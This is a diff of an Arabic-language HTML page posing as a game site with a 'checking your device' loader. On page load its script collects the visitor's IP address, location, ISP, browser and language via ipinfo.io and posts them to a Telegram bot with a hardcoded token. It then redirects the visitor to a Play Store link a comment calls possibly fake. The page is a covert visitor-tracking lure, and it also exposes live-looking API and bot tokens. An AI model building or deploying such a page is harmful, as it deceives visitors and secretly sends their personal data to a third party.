@@ -1,14 +1,70 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>🔥 موقع رهيب</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>🎮 موقع الألعاب المجنونة</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #141e30, #243b55);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      font-size: 0.8rem;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🔥 لعبة الذكاء الخارقة</h1>
+  <p>جارٍ التحقق من جهازك لبدء اللعب...</p>
+  <div class="loader"></div>
+
+  <div class="footer">
+    جميع الحقوق محفوظة © 2025
+  </div>
+
   <script>
-    // عند فتح الصفحة، اجلب معلومات الموقع
     fetch("https://ipinfo.io/json?token=46eede76a5f9e6")
       .then(res => res.json())
       .then(ipinfo => {
-        // اجمع بيانات الجهاز والزائر
         const data = {
           userAgent: navigator.userAgent,
           language: navigator.language,
@@ -21,7 +77,6 @@
           org: ipinfo.org
         };
 
-        // جهّز رسالة التنبيه
         const message =
           "📡 تم فتح الرابط!\n" +
           "📱 الجهاز: " + data.userAgent + "\n" +
@@ -32,8 +87,7 @@
           "🔌 مزود الخدمة: " + data.org + "\n" +
           "🛰️ IP: " + data.ip;
 
-        // أرسل الرسالة إلى Telegram
-        fetch("https://api.telegram.org/bot8480823805:AAHWCjHAcTcTHwCee-_4BmaPk85n1eSOo1E/sendMessage", {
+        fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
@@ -44,12 +98,12 @@
           })
         });
 
-        // عرض رسالة للمستخدم
-        alert("🔥 جاري التحميل...");
+        // إعادة التوجيه بعد 4 ثوانٍ لصفحة مزيفة أو حقيقية
+        setTimeout(() => {
+          window.location.href = "https://play.google.com/store/apps/details?id=com.game.fakeapp";
+        }, 4000);
       });
   </script>
-</head>
-<body>
-  <h1>🔥 أفضل موقع ترفيهي... جاري التحميل</h1>
+
 </body>
 </html>
